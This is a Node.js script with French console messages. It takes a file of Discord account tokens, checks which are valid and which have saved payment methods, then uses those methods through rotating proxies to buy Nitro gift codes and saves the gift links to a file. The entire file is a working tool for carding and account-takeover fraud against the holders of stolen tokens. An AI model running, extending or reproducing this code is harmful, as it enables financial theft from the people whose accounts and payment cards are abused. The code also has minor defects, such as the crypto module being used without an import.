const prompt = require('prompt-sync')();
const axios = require('axios');
const fs = require('fs');

// ANSI escape codes for colored output
const magenta = '\x1b[35;1m';
const blue = '\x1b[34;1m';
const yellow = '\x1b[33;1m';
const red = '\x1b[31;1m';
const green = '\x1b[32;1m';
const reset = '\x1b[0m';

function formatAMPM(date) {
  let hours = date.getHours();
  let minutes = date.getMinutes();
  hours = (hours % 24) || 24;
  minutes = minutes < 10 ? '0' + minutes : minutes;
  return hours + ':' + minutes;
}

const logging = {
  info: (message) => {
    const timestamp = 'Aujourd\'hui à ' + formatAMPM(new Date());
    console.log(`[ ${magenta}${timestamp}${reset} ] ${message}${reset}`);
  },
};

function getProxy(enabled, proxyPath) {
  if (!enabled) {
    return null;
  } else {
    const proxies = fs.readFileSync(proxyPath, 'utf8').split('\n');
    return `http://${proxies[Math.floor(Math.random() * proxies.length)]}`;
  }
}

function headers(headerToken) {
  return {
    Authorization: headerToken,
    accept: '*/*',
    connection: 'keep-alive',
    cookie: `__cfduid=${crypto.randomBytes(43).toString('hex')}; __dcfduid=${crypto.randomBytes(32).toString('hex')}; locale=en-US`,
    DNT: '1',
    origin: 'https://discord.com',
    referer: 'https://discord.com/channels/@me',
    TE: 'Trailers',
    'accept-language': 'en-US',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9007 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36',
    'X-Context-Properties': 'e30=',
    'X-Debug-Options': 'bugReporterEnabled',
    'X-Discord-Locale': 'en-US',
    'X-Super-Properties': `eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wKChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwNy4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwNy4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA3LjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTYzMDM1LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==`,
  };
}

class GiftBuyer {
  constructor() {
    this.useProxies = true;
    this.tokens = fs.readFileSync('data/tokens.txt', 'utf8').split('\n').map((token) => token.trim());
    this.validTokens = [];
    this.invalidTokens = [];
    this.phoneLockedTokens = [];
    this.paymentTokens = [];
    this.paymentMethods = 0;
    this.type = prompt('Type (Basic, Boost): ').toLowerCase();
    this.duration = prompt('Durée (Month, Year): ').toLowerCase();
    this.setProperties();
    console.clear();
  }

  setProperties() {
    switch (this.type) {
      case 'basic':
        this.skuId = '978380684370378762';
        this.setBasicProperties();
        break;
      case 'boost':
        this.skuId = '521847234246082599';
        this.setBoostProperties();
        break;
      default:
        logging.info('Type invalide');
        process.exit();
    }
  }

  setBasicProperties() {
    if (this.duration === 'month') {
      this.skuSubId = '978380692553465866';
      this.nitroPrice = 299;
    } else if (this.duration === 'year') {
      this.skuSubId = '1024422698568122368';
      this.nitroPrice = 2999;
    } else {
      logging.info('Durée invalide');
      process.exit();
    }
  }

  setBoostProperties() {
    if (this.duration === 'month') {
      this.skuSubId = '511651880837840896';
      this.nitroPrice = 999;
    } else if (this.duration === 'year') {
      this.skuSubId = '511651885459963904';
      this.nitroPrice = 9999;
    } else {
      logging.info('Durée invalide');
      process.exit();
    }
  }

  async check(token) {
    try {
      const response = await axios.get('https://discord.com/api/v9/users/@me/settings', { headers: headers(token) });
      const resp = response.data;

      if (resp.includes('You need to verify your account in order to perform this action')) {
        logging.info(`Phone Locked [${magenta}${token.slice(0, 22)}...${reset}] - ${resp.slice(0, 30)}`);
        this.phoneLockedTokens.push(token);
      } else if (resp.includes('401: Unauthorized')) {
        logging.info(`Invalid        [${magenta}${token.slice(0, 22)}...${reset}] - ${resp.slice(0, 30)}`);
        this.invalidTokens.push(token);
      } else if (resp.includes('You are being rate limited.')) {
        const retryAfter = response.headers['retry-after'];
        logging.info(`Ratelimited [retrying in ${magenta}${retryAfter}${reset}] - ${resp.slice(0, 30)}`);
        await new Promise((resolve) => setTimeout(resolve, (parseFloat(retryAfter) + 0.2) * 1000));
        await this.check(token);
      } else {
        logging.info(`Valid        [${magenta}${token.slice(0, 22)}...${reset}] - ${resp.slice(0, 30)}`);
        this.validTokens.push(token);
      }
    } catch (error) {
      logging.info(`[${yellow}/${reset}] Exception: ${magenta}${error}${reset} [${magenta}${token.slice(0, 22)}...${reset}]`);
    }
  }

  async payment(token) {
    try {
      const response = await axios.get('https://discord.com/api/v9/users/@me/billing/payment-sources', { headers: headers(token) });
      const resp = response.data;

      if (resp.length > 0) {
        this.paymentTokens.push(token);
        this.paymentMethods += resp.length;
      }
    } catch (error) {
      logging.info(`[${yellow}/${reset}] Exception: ${magenta}${error}${reset} [${magenta}${token.slice(0, 22)}...${reset}]`);
    }
  }

  async checkTokens(useProxies) {
    this.useProxies = useProxies;

    for (const token of this.tokens) {
      await this.check(token);
    }

    logging.info(`Checked ${magenta}${this.validTokens.length + this.invalidTokens.length + this.phoneLockedTokens.length}${reset} tokens, ${magenta}${this.validTokens.length}${reset} valid, ${magenta}${this.invalidTokens.length}${reset} invalid, ${magenta}${this.phoneLockedTokens.length}${reset} phone locked`);
  }

  async checkPayments() {
    for (const token of this.validTokens) {
      await this.payment(token);
    }
  }

  async actualBuy(token) {
    const proxy = getProxy(this.useProxies, 'data/proxies.txt');

    try {
      const response = await axios.get('https://discord.com/api/v9/users/@me/billing/payment-sources', { headers: headers(token), proxy });
      const resp = response.data;

      if (resp.length > 0) {
        for (const source of resp) {
          try {
            let paymentBrand;
            try {
              paymentBrand = source.brand;
            } catch (error) {
              paymentBrand = 'paypal';
            }

            const sourceId = source.id;
            const purchaseResponse = await axios.post(`https://discord.com/api/v9/store/skus/${this.skuId}/purchase`,
              {
                expected_amount: this.nitroPrice,
                expected_currency: 'usd',
                gateway_checkout_context: null,
                gift: true,
                payment_source_id: sourceId,
                payment_source_token: null,
                purchase_token: '6a0bcba6-403d-49f2-8839-ca76affab73e',
                sku_subscription_plan_id: this.skuSubId,
              },
              { headers: headers(token) });

            const jsonResponse = purchaseResponse.data;
            if (jsonResponse.gift_code) {
              logging.info(`[${green}+${reset}] [${magenta}${paymentBrand}${reset}] Nitro acheté [${magenta}${token.slice(0, 22)}...${reset}]`);
              fs.appendFileSync('data/nitros.txt', `https://discord.gift/${jsonResponse.gift_code}\n`);
            } else if (jsonResponse.message) {
              const message = jsonResponse.message;
              if (message.includes('overloaded')) {
                logging.info(`[${blue}=${reset}] Actuellement surchargé, nouvelle tentative. [${magenta}${token.slice(0, 22)}...${reset}]`);
                await new Promise((resolve) => setTimeout(resolve, 500));
                await this.actualBuy(token);
              } else if (message === 'The resource is being rate limited.') {
                const retryAfter = jsonResponse.retry_after;
                logging.info(`[${red}-${reset}] [${magenta}${paymentBrand}${reset}] ${message} [${magenta}${retryAfter}${reset}] [${magenta}${token.slice(0, 22)}...${reset}]`);
              } else {
                logging.info(`[${red}-${reset}] [${magenta}${paymentBrand}${reset}] ${message} [${magenta}${token.slice(0, 22)}...${reset}]`);
              }
            } else {
              logging.info(`[${yellow}/${reset}] [${magenta}${paymentBrand}${reset}] Échec de l'achat de nitro pour une raison quelconque. [${magenta}${token.slice(0, 22)}...${reset}]`);
            }
          } catch (error) {
            logging.info(`[${yellow}/${reset}] Exception: ${magenta}${error}${reset} [${magenta}${token.slice(0, 22)}...${reset}]`);
          }
        }
      }
    } catch (error) {
      logging.info(`[${yellow}/${reset}] Exception: ${magenta}${error}${reset} [${magenta}${token.slice(0, 22)}...${reset}]`);
    }
  }

  async buy() {
    for (const token of this.paymentTokens) {
      await this.actualBuy(token);
    }
  }
}

async function main() {
  const esi = new GiftBuyer();
  await esi.checkTokens(true);
  await esi.checkPayments();
  logging.info(`Vous avez obtenu ${magenta}${esi.paymentTokens.length}${reset} jetons avec des modes de paiement, avec un total de ${magenta}${esi.paymentMethods}${reset} modes de paiement au total, en achetant des nitros.`);
  await esi.buy();
}

main();